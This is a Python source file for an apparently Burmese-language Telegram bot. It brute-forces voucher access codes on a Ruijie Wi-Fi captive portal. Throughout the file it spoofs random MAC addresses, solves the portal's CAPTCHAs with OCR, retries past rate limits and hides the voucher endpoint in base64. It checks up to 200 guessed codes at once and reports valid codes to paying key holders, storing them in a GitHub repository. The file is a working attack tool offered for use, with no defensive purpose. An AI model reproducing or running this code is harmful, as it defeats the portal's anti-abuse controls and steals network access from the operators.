import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")
GITHUB_TOKEN = os.getenv("GH_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")
ADMIN_ID = os.getenv("ADMIN_ID")

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}              # {chat_id: {"session_url": ...}}
approve = {}                # {chat_id: True/False}
scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
# success_texts now stores dict: {chat_id: [{"code": ..., "session_id": ..., "plan": ...}, ...]}
success_texts = {}
old_success_texts = {}      # {chat_id: [...]} – previous session codes (before last /setup)
limited_texts = {}          # {chat_id: [code, ...]}
old_limited_texts = {}      # {chat_id: [code, ...]} – previous session limited codes
captcha_state = {}          # captcha cache per chat_id

# New additions
notify_setting = {}         # {chat_id: True/False} – notification toggle
last_scan_params = {}       # {chat_id: {"mode": str, "target": int|None}}
pending_brute = {}          # {chat_id: {"mode": str, "target": int|None}}
# notify message tracking: {chat_id: {"msg_id": int, "text": str}}
notify_state = {}

session = None
_connector = None

# ── Helper: send long text in ≤4096-char chunks split at newlines ──────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
    """Split text at newlines into Telegram-safe chunks and send each one."""
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id)
        return
    lines = text.split("\n")
    chunk = ""
    first = True
    for line in lines:
        candidate = chunk + ("\n" if chunk else "") + line
        if len(candidate) > MAX:
            if chunk:
                await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                       reply_to_message_id=reply_to_message_id if first else None)
                first = False
            chunk = line
        else:
            chunk = candidate
    if chunk:
        await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id if first else None)

CONCURRENCY = 200
_voucher_sem = None
_start_time = time.monotonic()

# ── Web server (keep alive) ────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ───────────────────────────────────────────────────────
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd':
            total_seconds += val * 86400
        elif unit == 'h':
            total_seconds += val * 3600
        elif unit == 'm':
            total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    """Parse plan string like '1d', '2h', '30min', '1mo', 'unlimit', '2h 30m' → total minutes."""
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield "".join(random.choice(chars) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling (per voucher) ─────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

# ── Balance checker (new) ──────────────────────────────────────────────────
def _parse_seconds(val):
    """Convert a numeric value to human-readable time string (treats value as seconds)."""
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    else:
        return f"{secs}s"

def _parse_minutes(val):
    """Convert a numeric value to human-readable time string (minutes → m/h/d/mo)."""
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(session_id):
    """Fetch remaining time for a given session_id. Returns string like '2h 30m' or 'N/A'."""
    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}"
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={session_id}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            raw = await resp.text()
            print(f"[get_balance] session_id={session_id} status={resp.status} body={raw[:300]}")
            if resp.status != 200:
                return "Error"
            try:
                data = json.loads(raw)
            except Exception:
                return "N/A"

            # Flatten: check top-level, nested 'result' and 'data' dicts
            candidates = [data]
            for nested_key in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                    candidates.append(data[nested_key])

            for d in candidates:
                if not isinstance(d, dict):
                    continue
                # Minutes-based keys — totalMinutes first (plan total), then remaining
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_minutes(val)
                # Seconds-based keys
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_seconds(val)

            return "N/A"
    except Exception as e:
        print(f"[get_balance] error for {session_id}: {e}")
        return "N/A"

# ── Core voucher check (used inside brute) ─────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None   # capture session_id for success logging
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue

            # Solve captcha
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
            except:
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {attempt+1}/3)")
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code  # recheck just returns code if still valid

        # Fetch plan duration immediately while session is fresh
        plan_str = "N/A"
        try:
            fetched = await get_balance(session_id)
            if isinstance(fetched, str) and fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        # Apply plan filter if specified (OR logic: code must satisfy at least one filter)
        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None  # doesn't match any plan filter, skip silently

        # Store success with session_id + cached plan duration
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str})

        # Notification if enabled — paginated: edit last page or start a new page when full
        if notify_setting.get(chat_id, False) and message:
            try:
                items = success_texts[chat_id]
                n = len(items)
                pages = notify_state.get(chat_id) or []
                MAX = 4096

                def build_page_text(first_idx):
                    lines = [f"`{it['code']}` – ⏳ {it.get('plan','N/A')}" for it in items[first_idx:]]
                    header = f"✅ Success Codes ({n}):\n" if first_idx == 0 else f"✅ Success Codes (cont. {first_idx+1}–{n}):\n"
                    return header + "\n".join(lines)

                if not pages:
                    text = build_page_text(0)
                    sent = await bot.send_message(chat_id, text, parse_mode="Markdown")
                    notify_state[chat_id] = [{"msg_id": sent.message_id, "first_idx": 0}]
                else:
                    last_page = pages[-1]
                    first_idx = last_page["first_idx"]
                    new_text = build_page_text(first_idx)
                    if len(new_text) <= MAX:
                        try:
                            await bot.edit_message_text(
                                chat_id=chat_id, message_id=last_page["msg_id"],
                                text=new_text, parse_mode="Markdown")
                        except Exception:
                            sent = await bot.send_message(chat_id, new_text, parse_mode="Markdown")
                            pages[-1] = {"msg_id": sent.message_id, "first_idx": first_idx}
                            notify_state[chat_id] = pages
                    else:
                        # Overflow: open a new page starting with this code
                        new_page_text = f"✅ Success Codes (cont. {n}):\n`{code}` – ⏳ {plan_str}"
                        sent = await bot.send_message(chat_id, new_page_text, parse_mode="Markdown")
                        pages.append({"msg_id": sent.message_id, "first_idx": n - 1})
                        notify_state[chat_id] = pages
            except Exception:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, False) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except:
                pass

# ── Brute-force runner ─────────────────────────────────────────────────────
success_messages = {}
limited_messages = {}

async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = None
    if mode in ["6", "7"]:
        total = 10 ** int(mode)

    checked = 0
    found = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "target": target, "plan_filters": plan_filters or []}
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(1000):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if (
                    str(chat_id) not in auth_list
                    or not check_key_expiration(auth_list[str(chat_id)])
                ):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    scan_tasks.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message,
                        plan_filters=plan_filters
                    )

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res:  # success code returned
                    found += 1
                    if target and found >= target:
                        await progress_msg.edit_text("🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text
                )
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        if progress_msg:
            finish_text = "✅ Scan completed."
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                await bot.send_message(chat_id, finish_text)
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub update scheduler ────────────────────────────────────────────────
async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    sid = item.get("session_id", "")
                    if chat_id not in results:
                        results[chat_id] = []
                    # Check if code already exists (support both old string format and new dict format)
                    existing_codes = [
                        e["code"] if isinstance(e, dict) else e
                        for e in results[chat_id]
                    ]
                    if code not in existing_codes:
                        results[chat_id].append({"code": code, "session_id": sid})
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

STATE_FILE = "state.json"

def save_state():
    """Persist user_data, approve, notify_setting, last_scan_params to disk."""
    try:
        payload = {
            "user_data": {str(k): v for k, v in user_data.items()},
            "approve": {str(k): v for k, v in approve.items()},
            "notify_setting": {str(k): v for k, v in notify_setting.items()},
            "last_scan_params": {str(k): v for k, v in last_scan_params.items()},
        }
        with open(STATE_FILE, "w") as f:
            json.dump(payload, f)
    except Exception as e:
        print(f"[save_state] error: {e}")

def load_state():
    """Load persisted state from disk into global dicts."""
    global user_data, approve, notify_setting, last_scan_params
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
        for k, v in payload.get("approve", {}).items():
            approve[int(k)] = v
        for k, v in payload.get("notify_setting", {}).items():
            notify_setting[int(k)] = v
        for k, v in payload.get("last_scan_params", {}).items():
            last_scan_params[int(k)] = v
        print(f"[startup] Loaded state for {len(user_data)} user(s) from {STATE_FILE}")
    except Exception as e:
        print(f"[load_state] error: {e}")

# ── Load saved results from GitHub on startup ──────────────────────────────
async def load_saved_results():
    """Load result.json from GitHub into success_texts on startup."""
    try:
        results, _ = await get_file_content("result.json")
        for chat_id_str, entries in results.items():
            try:
                cid = int(chat_id_str)
            except ValueError:
                continue
            if cid not in success_texts:
                success_texts[cid] = []
            for entry in entries:
                if isinstance(entry, dict):
                    code = entry.get("code", "")
                    sid = entry.get("session_id", "")
                    plan = entry.get("plan", "N/A")
                else:
                    code = str(entry)
                    sid = ""
                    plan = "N/A"
                # Avoid duplicates
                if not any(e["code"] == code for e in success_texts[cid]):
                    success_texts[cid].append({"code": code, "session_id": sid, "plan": plan})
        total = sum(len(v) for v in success_texts.values())
        print(f"[startup] Loaded {total} saved codes from GitHub result.json")
    except Exception as e:
        print(f"[startup] Could not load result.json: {e}")

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "/key - သင်၏ key ကို အတည်ပြုရန်\n"
        "/setup [session_url] - Session URL သတ်မှတ်ရန် (code အဟောင်းများ ဖျက်ပါမည်)\n"
        "/brute <mode> [target] [plan] - Code စတင်ရှာဖွေရန်\n"
        "   /brute 6 10 1d        → ၁ရက် code ၁၀ ခုရှာ\n"
        "   /brute 6 1d unlimit  → ၁ရက်(သို့) unlimit code ရှာ\n"
        "   /brute 6 10 1d 1mo   → ၁ရက် (သို့) ၁လ code ၁၀ ခုရှာ\n"
        "   /brute 6             → အစုံရှာ\n"
        "   plan: ကိုယ်ကြိုက်သလောက် (30min, 2h, 1d, 1mo, unlimit ...)\n"
        "/stop - ရှာဖွေနေသည့် လုပ်ငန်းစဉ်အားရပ်ရန်\n"
        "/resume - ရပ်ထားသည့် scan ကို ပြန်စရန်\n"
        "/saved - လက်ရှိ session success/limited codes ကြည့်ရန်\n"
        "/notify - code တွေ့တိုင်း အကြောင်းကြားချက်ကို On/Off ပြုလုပ်ရန်\n"
        "/recheck - သိမ်းထားသော success codes များကို ပြန်လည်စစ်ဆေးရန်\n"
        "/status - (Admin) Bot အခြေအနေကြည့်ရန်\n"
        "/genkey <duration> <user_id> - (Admin) Key ထုတ်ပေးရန်\n"
        "   duration: 30m, 1h, 2d, 1h30m, unlimited\n"
        "/delkey <user_id> - (Admin) Key ဖျက်ရန်\n"
        "/listkeys - (Admin) Key များကြည့်ရန်"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
        if check_key_expiration(auth_list[key]):
            approve[message.chat.id] = True
            user_data.setdefault(message.chat.id, {})
            save_state()
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            save_state()
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
        return
    url = args[1]
    if str(message.chat.id) != str(ADMIN_ID) and not approve.get(message.chat.id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = message.chat.id

        if cid in scan_tasks:
            task_info = scan_tasks.pop(cid, None)
            if task_info and task_info.get("task"):
                task_info["task"].cancel()

        user_data.setdefault(cid, {})
        user_data[cid]['session_url'] = url

        success_texts.pop(cid, None)
        limited_texts.pop(cid, None)
        old_success_texts.pop(cid, None)
        old_limited_texts.pop(cid, None)
        captcha_state.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)
        notify_state.pop(cid, None)

        # Clear this user's codes from GitHub result.json
        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear codes for {cid} on new setup")
        except Exception as e:
            print(f"[setup] Failed to clear GitHub result.json: {e}")

        save_state()
